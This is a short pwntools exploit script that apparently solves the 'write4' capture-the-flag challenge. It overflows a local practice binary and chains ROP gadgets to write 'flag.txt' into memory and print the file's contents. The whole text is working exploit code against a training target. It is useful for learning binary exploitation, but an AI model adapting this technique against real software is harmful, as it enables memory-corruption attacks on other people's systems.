from pwn import *

trash = cyclic(40)
bss = p64(0x00601038)
print_fun = p64(0x00400620)
mov_r14_r15 = p64(0x0000000000400628) #move r[14], r15
pop_r14_r15 = p64(0x0000000000400690)
pop_rdi = p64(0x0000000000400693)


payload = trash
payload += pop_r14_r15 + bss + b"flag.txt"
payload += mov_r14_r15
payload += pop_rdi + bss
payload += print_fun + p64(0)

p = process("./write4")
p.sendline(payload)
p.interactive()
